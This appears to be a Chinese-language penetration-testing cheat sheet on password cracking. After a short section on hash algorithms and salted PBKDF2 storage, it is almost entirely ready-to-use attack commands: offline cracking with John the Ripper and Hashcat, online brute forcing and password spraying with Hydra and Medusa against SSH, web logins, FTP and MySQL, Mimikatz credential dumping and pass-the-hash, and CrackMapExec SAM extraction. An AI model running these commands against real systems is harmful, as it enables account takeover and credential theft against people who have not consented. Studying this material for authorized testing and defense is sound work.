## 一、密码存储机制

### 常见哈希算法

| 算法 | 特点 | 安全性 |
|------|------|--------|
| MD5 | 128位，已淘汰 | ❌ 可被暴力/彩虹表破解 |
| SHA-1 | 160位，已不推荐 | ❌ 可被暴力破解 |
| SHA-256 | 256位，较安全 | ✅ ，但仍需加盐 |
| bcrypt | 自适应 cost factor | ✅ 推荐 |
| Argon2 | 现代算法，内存hard | ✅ 最推荐 |
| PBKDF2 | 多次迭代哈希 | ✅ |

### 加盐哈希

```python
# 不安全
hash("password123")  # 每个相同密码哈希相同

# 安全（加盐）
import hashlib, secrets
salt = secrets.token_hex(16)
h = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
# 存储：salt + ':' + h.hex()
```

## 二、离线密码破解

### John the Ripper

```bash
# 基本用法
john --wordlist=/usr/share/john/password.lst hash.txt

# 自动检测哈希类型
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 特定格式
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=nt2 --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hashes.txt

# 暴力破解（无字典）
john --incremental:All hash.txt

# 显示已破解的密码
john --show hash.txt

# 破解指定用户
john --wordlist=pass.txt --users=admin,root hash.txt

# 导出结果
john --show --format=md5crypt hash.txt > cracked.txt
```

### Hashcat（GPU 加速）

```bash
# Hashcat 比 John 快很多，支持 GPU 加速

# 基本用法
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0  : MD5
# -m 1000: NTLM
# -m 1800: sha-512
# -m 3200: bcrypt
# -a 0  : 字典攻击
# -a 3  : 暴力破解

# 常用哈希类型
# -m 0   : MD5
# -m 100 : SHA1
# -m 1000: NTLM
# -m 1400: SHA256
# -m 1700: SHA512
# -m 3200: bcrypt ($2*$)
# -m 10900: PBKDF2-HMAC-SHA256

# 暴力破解（8位数字）
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d

# 混合攻击（字典 + 规则）
hashcat -m 0 -a 6 hash.txt dict.txt ?d?d?d

# GPU 利用率最大化
hashcat -m 0 -a 0 -O hash.txt wordlist.txt
# -O : 优化模式（使用寄存器减少内存使用）

# 查看攻击速度
hashcat -m 0 -b | grep MD5
```

### 彩虹表

```bash
# RainbowCrack
# 下载彩虹表：https://project-rainbowcrack.com/table.htm

# 使用 rcrack
rcrack /path/to/tables/ -f hash.txt
```

## 三、在线暴力破解

### Hydra（最流行的在线破解工具）

```bash
# 基本语法
hydra -l username -P password.txt service://target

# SSH 暴力破解
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# HTTP 表单破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
# 格式：URL:POST数据:失败响应

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.1.100/admin/

# FTP
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100

# 多线程
hydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 使用用户名列表
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 输出结果
hydra -l admin -P pass.txt ssh://192.168.1.100 -o result.txt
```

### Medusa

```bash
# SSH 破解
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# 速度快，支持更多模块
medusa -M ssh -h 192.168.1.100 -u admin -P pass.txt
```

### 密码喷射（Password Spraying）

避免锁定账户，尝试同一密码登录多个账户：

```python
# 用一个密码尝试多个用户
common_passwords = ["Password123!", "Welcome2024"]
users = load_users()

for pwd in common_passwords:
    for user in users:
        if try_login(user, pwd):
            print(f"Found: {user}:{pwd}")
```

```bash
# Hydra 密码喷射
# -e ns: 尝试空密码和用户名作为密码
hydra -L users.txt -e ns ssh://192.168.1.100
```

## 四、Pass the Hash（哈希传递）

攻击者获取密码哈希后，不需要破解，直接用哈希认证：

### 在 Kali 中使用

```bash
# 使用 Mimikatz（从内存/哈希文件提取）
mimikatz

# 从 SAM 数据库提取 NTLM 哈希
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam

# Pass the Hash
mimikatz # sekurlsa::pth /user:administrator /ntlm:<NTLM_HASH> /domain:target.local
# 弹出新窗口，用该哈希执行命令

# Meterpreter 中
meterpreter > hashdump
# 或
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token DOMAIN\\admin
```

### CrackMapExec

```bash
# Pass the Hash
crackmapexec smb 192.168.1.0/24 -u admin -H <NTLM_HASH> -x "whoami"

# 获取 SAM 数据库
crackmapexec smb 192.168.1.100 -u admin -H <NTLM_HASH> --sam
```

## 六、常见密码破解场景

### /etc/shadow 破解

```bash
# 合并 /etc/passwd 和 /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# 破解
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### ZIP 文件密码破解

```bash
# ZIP
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip

# 或
zip2john protected.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### SSH 密钥密码破解

```bash
# 私钥格式
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
